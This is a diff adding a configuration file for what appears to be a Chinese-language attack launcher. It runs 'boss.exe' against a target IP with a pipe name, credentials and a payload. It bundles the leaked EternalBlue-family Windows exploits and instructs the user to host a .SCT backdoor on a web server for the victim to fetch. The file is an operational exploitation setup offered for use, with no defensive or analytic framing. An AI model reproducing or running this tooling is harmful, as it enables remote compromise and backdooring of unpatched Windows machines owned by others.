@@ -1,0 +1,33 @@
+<sfjt>inject</sfjt>
+<ljfs>NB</ljfs>
+<sctype>yuan</sctype>
+<cs1mc>目标ip</cs1mc>
+<cs2mc>Pipe_name</cs2mc>
+<cs3mc>Username</cs3mc>
+<cs4mc>Password</cs4mc>
+<cs5mc>连接延迟/S</cs5mc>
+<zbz>2</zbz>
+<bz1><cmd>boss.exe ***<cs1/>*** ***<cs2/>*** ***<cs3/>*** ***<cs4/>*** <sc/></cmd></bz1>
+<bz2><cmd>ping -n <cs5/> 127.1 >nul</cmd></bz2>
+<bz1fk>Ready Attack !</bz1fk>
+<bz2fk>Ready Connect</bz2fk>
+<bz>---------------------------------------------------
+《永恒之蓝、翡翠纤维、永恒王者、古怪地鼠、爱斯基摩卷、永恒浪漫、文雅学者、永恒增效、日食之翼、英国牙医、尊重审计、爆炸罐头》
+
+ALL PACK OF WINDOWS!
+---------------------------------------------------
+Notice：使用之前，你需要确保
+---------------------------------------------------
+python == python2.7
+
+one.    pip install impacket
+two.    pip install numpy
+three . pip install pystruct
+---------------------------------------------------
+
+1. 你搭建了一个WEB服务器，并挂载了 .SCT 后门文件
+2. Buffer options 面板的 Netcat Bind 路径需要填写 .SCT 后门文件的链接
+3. 不知道用户名和密码就不要填写
+4. 不知道 pipe_name 也不要填写
+5. 打架算成本
+---------------------------------------------------</bz>
